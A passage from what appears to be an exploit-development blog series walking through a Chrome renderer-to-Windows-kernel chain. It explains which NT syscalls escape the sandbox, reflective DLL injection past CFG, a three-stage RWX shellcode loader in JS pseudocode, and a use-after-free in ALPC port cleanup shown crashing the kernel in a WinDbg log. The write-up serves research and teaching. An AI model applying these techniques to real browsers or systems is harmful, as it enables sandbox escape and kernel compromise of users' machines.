+&lt;p&gt;When the port closes, the kernel loops through the messages still on the queue to clean them up, and per message it calls &lt;code&gt;AlpcpCancelMessage&lt;/code&gt;. The &lt;code&gt;xchg&lt;/code&gt; instruction at offset &lt;code&gt;+0x358&lt;/code&gt; inside that function does a write to &lt;code&gt;+0x578&lt;/code&gt; of the &lt;code&gt;_ETHREAD&lt;/code&gt; pointed to by &lt;code&gt;msg+0x20&lt;/code&gt; &amp;#x2014; but that &lt;code&gt;_ETHREAD&lt;/code&gt; is already dead and back in the slab! Writing to something that isn&amp;#x2019;t there means the write goes into a freed page, and off we go straight to BSOD. &amp;#x1F4A5;&lt;/p&gt;
+&lt;p&gt;By the way, there&amp;#x2019;s also a reason we didn&amp;#x2019;t bother building a server-client port pair and instead just stood up a single &lt;strong&gt;anonymous port&lt;/strong&gt; with &lt;code&gt;NtAlpcCreatePort&lt;/code&gt;, catching the sink on the &lt;code&gt;CloseHandle(hPort)&lt;/code&gt; path &amp;#x2014; this path naturally lines up with the &lt;code&gt;LpcpCopyRequestData&lt;/code&gt; gate that leads to the Read/Write primitive in Step 6! (That&amp;#x2019;s a Step 6 spoiler though, so I&amp;#x2019;ll stop right there haha)&lt;/p&gt;
+&lt;h1 id=&#34;3-Chrome-to-ALPC-With-BSOD&#34;&gt;&lt;a href=&#34;#3-Chrome-to-ALPC-With-BSOD&#34; class=&#34;headerlink&#34; title=&#34;3. Chrome to ALPC (With BSOD)&#34;&gt;&lt;/a&gt;3. Chrome to ALPC (With BSOD)&lt;/h1&gt;&lt;p&gt;Okay, so far it&amp;#x2019;s all been kernel-side chatter, right? But where we&amp;#x2019;re actually standing is &lt;em&gt;inside the renderer process&lt;/em&gt;, and on top of that, inside a sandbox that&amp;#x2019;s been crushed under Untrusted IL. We&amp;#x2019;ve got a Restricted Token slapped on us, the Job Object blocks process creation, we can&amp;#x2019;t touch files, we can&amp;#x2019;t open network sockets. So how on earth do we run that syscall sequence from inside this prison cell?? &amp;#x1F914;&lt;/p&gt;
+&lt;p&gt;This is exactly where the fact I planted at the very start pays off. &lt;strong&gt;Chrome&amp;#x2019;s sandbox slams the door shut on files, network, and win32k, but it does not gate the NT syscalls that ntdll exposes.&lt;/strong&gt; So even from Untrusted IL, things like &lt;code&gt;NtCreateIoCompletion&lt;/code&gt;, &lt;code&gt;NtCreateWorkerFactory&lt;/code&gt;, &lt;code&gt;NtAlpcCreatePort&lt;/code&gt;, &lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt;, &lt;code&gt;NtClose&lt;/code&gt; &amp;#x2014; you can just call them!&lt;/p&gt;
+&lt;p&gt;In Steps 2&amp;#x2013;3, ji9umi already handed us renderer RCE (V8 arbitrary R/W + WASM &lt;code&gt;IndirectFunctionTable&lt;/code&gt; for short shellcode execution). Great launch pad, but a bit cramped for freely calling kernel syscalls. What we need is an execution environment where native code can run around freely inside the renderer. So we&amp;#x2019;re going to plant a trigger DLL inside the renderer and run the sequence above from there!&lt;/p&gt;
+&lt;h2 id=&#34;3-1-sRDI-Shellcode-Reflective-DLL-Injection&#34;&gt;&lt;a href=&#34;#3-1-sRDI-Shellcode-Reflective-DLL-Injection&#34; class=&#34;headerlink&#34; title=&#34;3.1 sRDI (Shellcode Reflective DLL Injection)&#34;&gt;&lt;/a&gt;3.1 sRDI (Shellcode Reflective DLL Injection)&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/monoxgas/srdi&#34;&gt;https://github.com/monoxgas/srdi&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;When I say &amp;#x201C;plant a DLL&amp;#x201D;, &lt;code&gt;LoadLibrary&lt;/code&gt; comes to mind, right? But as I mentioned earlier, the Untrusted IL renderer has almost no file-system access, so we can&amp;#x2019;t drop a DLL file on disk. &lt;code&gt;LoadLibraryA(&amp;quot;C:\\payload.dll&amp;quot;)&lt;/code&gt; doesn&amp;#x2019;t even get out the gate.. &amp;#x1F972;&lt;/p&gt;
+&lt;p&gt;But here&amp;#x2019;s the fun bit! &lt;code&gt;ntdll.dll&lt;/code&gt; is already mapped into the renderer, and &amp;#x201C;self-address-space-manipulation&amp;#x201D; syscalls like &lt;code&gt;NtAllocateVirtualMemory&lt;/code&gt; / &lt;code&gt;NtProtectVirtualMemory&lt;/code&gt; aren&amp;#x2019;t blocked by the sandbox. Making an executable page in your own process is not something the sandbox blocks (if the process has ACG on this gets blocked too, but Chrome renderer doesn&amp;#x2019;t enable ACG by default).&lt;/p&gt;
+&lt;p&gt;Through that crack, the trick to plant code purely in memory is &lt;strong&gt;sRDI&lt;/strong&gt;! You pre-pack the DLL into a relocatable blob, and on load, without touching the file system at all, it resolves imports/relocs and starts executing right there in memory. Doesn&amp;#x2019;t open files, doesn&amp;#x2019;t spawn processes, doesn&amp;#x2019;t use the network.&lt;/p&gt;
+&lt;p&gt;&amp;#x1F4A1;&lt;br&gt;But why bother laying down the DLL &lt;strong&gt;in full PE image shape&lt;/strong&gt; instead of raw shellcode? This is another thing I learned while reproducing it &amp;#x2014; if you just drop raw code onto an RWX page and hit it with &lt;code&gt;CreateThread&lt;/code&gt;, the renderer&amp;#x2019;s &lt;strong&gt;CFG (Control Flow Guard)&lt;/strong&gt; slams the door on you. &amp;#x1F6AB; CFG checks via bitmap whether a thread start address is &amp;#x201C;inside a properly loaded image,&amp;#x201D; and a raw RWX address with no image backing doesn&amp;#x2019;t pass. sRDI fully dresses the code up with MZ/PE headers, per-section protection attributes, and even registers SEH via &lt;code&gt;RtlAddFunctionTable&lt;/code&gt;, so to the kernel/loader it looks like &amp;#x201C;a genuinely loaded module.&amp;#x201D; That&amp;#x2019;s why &lt;code&gt;CreateThread&lt;/code&gt; targeting a function inside it passes the CFG check! I actually tested this &amp;#x2014; raw PIC and even &amp;#x201C;PE-less, RX-only protected&amp;#x201D; pages all got blocked; only a full PE mapping (sRDI) made it through. &amp;#x1F643;&lt;/p&gt;
+&lt;h2 id=&#34;3-2-Three-stage-commit-stub&#34;&gt;&lt;a href=&#34;#3-2-Three-stage-commit-stub&#34; class=&#34;headerlink&#34; title=&#34;3.2 Three-stage commit stub&#34;&gt;&lt;/a&gt;3.2 Three-stage commit stub&lt;/h2&gt;&lt;p&gt;There&amp;#x2019;s one more problem. The execution foothold V8 hands us initially is meant for WASM code and it&amp;#x2019;s pretty cramped &amp;#x2014; too tight to slap an 8KB-ish sRDI blob on top of. So we use a slightly hand-cranked three-stage trick!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image11.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;First plant and run a &lt;strong&gt;154-byte commit_stub&lt;/strong&gt; &amp;#x2192; walks the PEB&amp;#x2019;s &lt;code&gt;Ldr.InLoadOrder&lt;/code&gt; to find &lt;code&gt;kernel32.dll&lt;/code&gt;, resolves &lt;code&gt;VirtualAlloc&lt;/code&gt; on its own &amp;#x2192; allocates a generous heap right next to it with &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Copy the &lt;strong&gt;sRDI blob&lt;/strong&gt; into that generous heap&lt;/li&gt;
+&lt;li&gt;A 12-byte &lt;code&gt;mov rax, addr; jmp rax&lt;/code&gt; trampoline jumps into sRDI&amp;#x2019;s &lt;code&gt;Reflective_Loader&lt;/code&gt; &amp;#x2192; resolves imports/relocs and calls the DLL&amp;#x2019;s exported &lt;code&gt;RunExploit&lt;/code&gt;!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The JS side flow looks roughly like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Stage 1: commit_stub onto the foothold page&lt;/span&gt;
+arbitrary_write(rwx, commit_stub_bytes);
+shellcode();                          &lt;span class=&#34;hljs-comment&#34;&gt;// stub runs &amp;#x2192; VirtualAlloc&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// Stage 2: sRDI blob into the committed big RWX heap&lt;/span&gt;
+arbitrary_write(commit_addr, sRDI_bytes);
+
+&lt;span class=&#34;hljs-comment&#34;&gt;// Stage 3: trampoline &amp;#x2192; Reflective_Loader &amp;#x2192; RunExploit&lt;/span&gt;
+arbitrary_write(rwx, trampoline);
+shellcode();&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;By the time we&amp;#x2019;re here, the C code we wrote is actually running as real x64 native inside the renderer. Now we can run the UAF scenario inside it exactly as designed!&lt;/p&gt;
+&lt;h2 id=&#34;3-3-BSOD-via-the-trigger-DLL&#34;&gt;&lt;a href=&#34;#3-3-BSOD-via-the-trigger-DLL&#34; class=&#34;headerlink&#34; title=&#34;3.3 BSOD via the trigger DLL&#34;&gt;&lt;/a&gt;3.3 BSOD via the trigger DLL&lt;/h2&gt;&lt;p&gt;Finally, hands-on time! The trigger DLL is dead boring. What matters here is verifying that the UAF definitely fires, so:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs powershell&#34;&gt;verifier /flags &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x9BB /driver ntoskrnl.exe&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You&amp;#x2019;ve got to run the above command to make sure the UAF doesn&amp;#x2019;t slip through silently! What this command does is give special treatment to the kernel&amp;#x2019;s pool allocations/frees so that touching a freed address triggers an immediate page fault. A lot of the time UAFs just quietly pass by, so this catches them!&lt;/p&gt;
+&lt;p&gt;Back to the trigger &amp;#x2014; it has a single &lt;code&gt;RunExploit&lt;/code&gt; export, and all it does is walk the UAF scenario as-is. Open the sample page and there&amp;#x2019;s exactly one button on screen: &amp;#x201C;Exploit Me&amp;#x201D;. Let&amp;#x2019;s click it and see if we get a BSOD!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image12.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Click the button and &amp;#x2014; same way ji9umi did back in Step 3 &amp;#x2014; Renderer RCE lands, the planted sRDI runs, and a few seconds later, BSOD!!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image13.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; !analyze -v
+Connected to Windows 10 22621 x64 target at (Sun Jul 19 20:15:13.523 2026 (UTC + 9:00)), ptr64 TRUE
+Loading Kernel Symbols
+..........................................
+
+Press ctrl-c (cdb, kd, ntsd) &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; ctrl-&lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt; (windbg) to &lt;span class=&#34;hljs-built_in&#34;&gt;abort&lt;/span&gt; symbol loads that take too &lt;span class=&#34;hljs-keyword&#34;&gt;long&lt;/span&gt;.
+Run !sym noisy before .reload to track down problems loading symbols.
+
+.....................
+................................................................
+.........................................................
+Loading User Symbols
+................................
+Loading unloaded &lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;
+..................
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+PAGE_FAULT_IN_NONPAGED_AREA (&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;)
+Invalid system memory was referenced.  This cannot be &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; by &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;-except.
+Typically the address is just plain bad &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; it is pointing at freed memory.
+Arguments:
+Arg1: ffff900dcddceb78, memory referenced.
+Arg2: &lt;span class=&#34;hljs-number&#34;&gt;0000000000000002&lt;/span&gt;, X64: bit &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the fault was due to a &lt;span class=&#34;hljs-keyword&#34;&gt;not&lt;/span&gt;-present PTE.
+    bit &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; is &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the fault was due to a write, clear &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; a read.
+    bit &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; is &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the processor decided the fault was due to a corrupted PTE.
+    bit &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt; is &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the fault was due to attempted execute of a no-execute PTE.
+    - ARM64: bit &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; is &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the fault was due to a write, clear &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; a read.
+    bit &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; is &lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the fault was due to attempted execute of a no-execute PTE.
+Arg3: fffff8037e0fcf6c, If non-zero, the instruction address which referenced the bad memory
+    address.
+Arg4: &lt;span class=&#34;hljs-number&#34;&gt;0000000000000002&lt;/span&gt;, (reserved)
+
+BUGCHECK_CODE:  &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;
+
+BUGCHECK_P1: ffff900dcddceb78
+
+BUGCHECK_P2: &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;
+
+BUGCHECK_P3: fffff8037e0fcf6c
+
+BUGCHECK_P4: &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;
+
+FAULTING_THREAD:ffff900dc22be600EXCEPTION_PARAMETER1:  &lt;span class=&#34;hljs-number&#34;&gt;0000000000000001&lt;/span&gt;
+
+EXCEPTION_PARAMETER2:  ffff900dcddceb78
+
+WRITE_ADDRESS:  ffff900dcddceb78
+
+MM_INTERNAL_CODE:  &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;
+
+PROCESS_NAME:  chrome.exe
+
+IP_IN_PAGED_CODE:
+nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;358&lt;/span&gt;
+fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fcf6c &lt;span class=&#34;hljs-number&#34;&gt;48878178050000&lt;/span&gt;  xchg    rax,qword ptr [rcx+&lt;span class=&#34;hljs-number&#34;&gt;578&lt;/span&gt;h]
+
+STACK_TEXT:
+ffffc182`d4b55c58 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;df61ac2     : ffffc182`d4b55dc0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;dd92480 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;c664180 ffff900d`cddceb01 : nt!DbgBreakPointWithStatus
+ffffc182`d4b55c60 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;df611b3     : fffff803`&lt;span class=&#34;hljs-number&#34;&gt;00000003&lt;/span&gt; ffffc182`d4b55dc0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;de4aaa0 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000050&lt;/span&gt; : nt!KiBugCheckDebugBreak+&lt;span class=&#34;hljs-number&#34;&gt;0x12&lt;/span&gt;
+ffffc182`d4b55cc0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;de31807     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ffffc182`d4b56690 ffff900d`cddceb78 : nt!KeBugCheck2+&lt;span class=&#34;hljs-number&#34;&gt;0xba3&lt;/span&gt;
+ffffc182`d4b56430 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;de8a32f     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000050&lt;/span&gt; ffff900d`cddceb78 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000002&lt;/span&gt; ffffc182`d4b56690 : nt!KeBugCheckEx+&lt;span class=&#34;hljs-number&#34;&gt;0x107&lt;/span&gt;
+ffffc182`d4b56470 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;dc5ccac     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000048&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000002&lt;/span&gt; ffffc182`d4b56629 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : nt!MiSystemFault+&lt;span class=&#34;hljs-number&#34;&gt;0x23059f&lt;/span&gt;
+ffffc182`d4b56570 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;de42329     : ffffffff`ffffffff &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000002&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : nt!MmAccessFault+&lt;span class=&#34;hljs-number&#34;&gt;0x29c&lt;/span&gt;
+ffffc182`d4b56690 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fcf6c     : ffffa307`cb0b0ce0 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000008&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ffff900d`&lt;span class=&#34;hljs-number&#34;&gt;72&lt;/span&gt;a48f80 : nt!KiPageFault+&lt;span class=&#34;hljs-number&#34;&gt;0x369&lt;/span&gt;
+ffffc182`d4b56820 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fc09b     : ffffffff`&lt;span class=&#34;hljs-number&#34;&gt;00000001&lt;/span&gt; ffff900d`c9466e20 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00010000&lt;/span&gt; ffffffff`ffffffff : nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;0x358&lt;/span&gt;
+ffffc182`d4b568a0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fbdef     : ffffffff`ffffffff ffff900d`c9466e20 ffff900d`c9466f80 ffff900d`c9466e20 : nt!AlpcpFlushQueue+&lt;span class=&#34;hljs-number&#34;&gt;0x117&lt;/span&gt;
+ffffc182`d4b568e0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fc24f     : ffffffff`ffffffff ffffffff`ffffffff ffffc182`d4b56a49 ffff900d`c9466e20 : nt!AlpcpFlushMessagesPort+&lt;span class=&#34;hljs-number&#34;&gt;0x27&lt;/span&gt;
+ffffc182`d4b56920 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fc97b     : ffff900d`c9466e20 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000001&lt;/span&gt; ffff900d`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;cdeef20 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00040286&lt;/span&gt; : nt!AlpcpDoPortCleanup+&lt;span class=&#34;hljs-number&#34;&gt;0x8f&lt;/span&gt;
+ffffc182`d4b56960 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;cae78     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000001&lt;/span&gt; ffffc182`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;0000052&lt;/span&gt;c ffffffff`ffffffff : nt!AlpcpClosePort+&lt;span class=&#34;hljs-number&#34;&gt;0x4b&lt;/span&gt;
+ffffc182`d4b56990 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;c85a9     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000544&lt;/span&gt; ffffc182`d4b56a00 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;0000052&lt;/span&gt;c ffffa307`&lt;span class=&#34;hljs-number&#34;&gt;00000002&lt;/span&gt; : nt!ObpCloseHandle+&lt;span class=&#34;hljs-number&#34;&gt;0x298&lt;/span&gt;
+ffffc182`d4b56ab0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;de464e5     : ffff900d`c22be600 ffff900d`c22be600 ffffffff`e8287c00 ffff900d`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : nt!NtClose+&lt;span class=&#34;hljs-number&#34;&gt;0x39&lt;/span&gt;
+ffffc182`d4b56ae0 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;a12efe4     : &lt;span class=&#34;hljs-number&#34;&gt;000001&lt;/span&gt;a9`c18c1352 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;a12f850 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ffffffff`e8287c00 : nt!KiSystemServiceCopyEnd+&lt;span class=&#34;hljs-number&#34;&gt;0x25&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb718 &lt;span class=&#34;hljs-number&#34;&gt;000001&lt;/span&gt;a9`c18c1352     : &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;a12f850 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ffffffff`e8287c00 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;99208960&lt;/span&gt; : ntdll!NtClose+&lt;span class=&#34;hljs-number&#34;&gt;0x14&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb720 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;a12f84f     : &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ffffffff`e8287c00 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;99208960&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : &lt;span class=&#34;hljs-number&#34;&gt;0x000001a9&lt;/span&gt;`c18c1352
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb728 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;     : ffffffff`e8287c00 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;99208960&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : ntdll!NtResumeThread+&lt;span class=&#34;hljs-number&#34;&gt;0x1f&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb730 ffffffff`e8287c00     : &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;99208960&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : &lt;span class=&#34;hljs-number&#34;&gt;0x00007fff&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb738 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;99208960&lt;/span&gt;     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : &lt;span class=&#34;hljs-number&#34;&gt;0xffffffff&lt;/span&gt;`e8287c00
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb740 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : KERNEL32!SleepStub
+
+SYMBOL_NAME:  nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;358&lt;/span&gt;
+
+MODULE_NAME:ntIMAGE_NAME:  ntkrnlmp.exe
+
